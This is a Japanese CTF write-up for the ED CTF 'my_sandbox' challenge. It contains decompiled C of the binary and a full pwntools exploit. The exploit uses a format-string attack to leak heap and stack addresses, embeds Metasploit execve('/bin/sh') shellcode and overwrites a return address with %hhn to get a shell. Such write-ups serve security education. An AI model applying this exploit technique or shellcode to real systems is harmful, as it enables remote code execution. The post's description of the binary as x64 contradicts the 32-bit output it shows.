---
layout: post
alias: "/blog/2016/02/21/ed-ctf-my-sandbox/"
date: 2016-02-21T09:44:29+09:00
tags: [ "ctf", "writeup", "pwn", "ed-ctf", "format-string-attack", "heap" ]
---

# ED CTF my\_sandbox

<https://www.dropbox.com/sh/74yf95b0u6gsbkm/AACb2UoOuLUW71dGSid8zOwha/My%20Sandbox>

解いた。
砂場と称して、自分の入力以外視界に入らない砂漠に放り出される問題。
与えられたlibcを使って手元で実行すると `malloc` でsegvしたので自分の環境のそれを使って解いた。

### 準備

``` sh
    $ file my_sandbox
    my_sandbox: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=44ab05f5782a9a5dbae69dd6acea3741c79f7b01, stripped
    $ checksec --file my_sandbox
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
    Full RELRO      No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   my_sandbox
```

x64。xinted型。libcは与えられる。

``` c
    #include <stdio.h>

    void vuln(char *arg) {
        char buf[0x400]; // ebp-0x41c
        char *s; // ebp-0x1c
        char *r; // ebp-0x18
        char *q; // ebp-0x14
        char *p; // ebp-0x10
        int len; // ebp-0xc
        len = strlen(arg);
        memcpy(buf, 0, 4 + 0xff);
        p = malloc(len + 1000004);
        q = p + len + 1000000;
        r = q - len - 4;
        s = r + 0x20;
        if (p == 0) {
            write(1, "Sorry, something went wrong!!!\n", 0x1f);
            return;
        }
        write(1, "Entered: ", 9);
        // mov    DWORD PTR gs:0x14,esp
        // mov    esp,DWORD PTR [ebp-0x18] # r
        memcpy(s, arg, len);
        snprintf(buf, len, s);
        // mov    esp,DWORD PTR gs:0x14
        write(1, buf, len);
        write(1, "\n\n", 2);
        free(p);
    }

    char name[0x80]; // 0x804a040

    int main(void) {
        char buf[0x400]; // esp+0x1c
        int i; // esp+0x41c
        write("Your name please: ");
        read(0, name, 0x80);
        write();
        sleep(1);
        write("This program has an bug.\n");
        sleep(1);
        write();
        sleep(1);
        write();
        write();
        sleep(1);
        for (i = 0; i < 10; ++i) {
            write("Enter your message: ");
            memset(buf, 0, sizeof(buf));
            fgets(buf, sizeof(buf) - 1, stdin);
            vuln(buf);
        }
        write();
        write("See you\n\n");
    }
```

### 攻撃

format文字列攻撃であるがespがheap上に移動しているので遠回り。

1.  名前を聞かれるのでshellcodeを答えておく。
2.  `malloc`の次のchunkのheaderを読む。espの移動先であるchunkのアドレスを適当に求める。
3.  `snprintf`の書き込み先として与えられている本来のstack上のbufferへのアドレスを読み、stackのアドレスを手に入れる。
4.  shellcodeを入れておいた名前のbufferに飛ぶ。

### 実装

``` python
    #!/usr/bin/env python2
    from pwn import *
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('host')
    parser.add_argument('port', type=int)
    args = parser.parse_args()
    context.log_level = 'debug'

    name     = 0x804a040 # writing 2byte is enough
    vuln_ret = 0x804889d

    buf_ix = 6 # %6$p shows the buffer
    buf_ebpofs = 0x41c
    snprintf_ret = 0x80486e6
    ret_ebp_diff = 2108

    if True:
        chunk_header_ix = 1307
        magic_diff = 1804764

    # metasploit
    # >   $ msfconsole
    # >   msf > use payload/linux/x86/exec
    # >   msf payload(exec) > generate -o CMD=/bin/sh
    shellcode =  \
        "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73" + \
        "\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00" + \
        "\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd" + \
        "\x80"

    p = remote(args.host, args.port)

    p.recvuntil('Your name please: ')
    p.send(shellcode)

    p.recvuntil('Enter your message: ')
    payload = ''
    payload += '%%%d$p' % chunk_header_ix
    payload += ' ' * 100
    p.sendline(payload)
    p.recvuntil('Entered: ')
    malloced = int(p.recvn(len(payload)).split()[0], 16) - magic_diff
    log.info('malloced buffer: ' + hex(malloced))

    p.recvuntil('Enter your message: ')
    payload = ''
    payload += '%%%d$s' % (buf_ix + 1)
    payload += p32(malloced)
    payload += ' ' * 100
    p.sendline(payload)
    p.recvuntil('Entered: ')
    buf = u32(p.recvn(len(payload))[:4])
    ebp = buf - buf_ebpofs
    log.info('buf: ' + hex(buf))
    log.info('ebp: ' + hex(ebp))
    ret_addr = ebp + ret_ebp_diff

    p.recvuntil('Enter your message: ')
    payload = ''
    payload += p32(ret_addr)
    payload += p32(ret_addr + 1)
    payload += 'A' * ((ord(p32(name)[0]) - len(payload)) % 256)
    payload += '%%%d$hhn' % buf_ix
    payload += 'A' * ((ord(p32(name)[1]) - ord(p32(name)[0])) % 256)
    payload += '%%%d$hhn' % (buf_ix + 1)
    p.sendline(payload)

    time.sleep(0.1)
    p.sendline('ls')
    p.interactive()
```
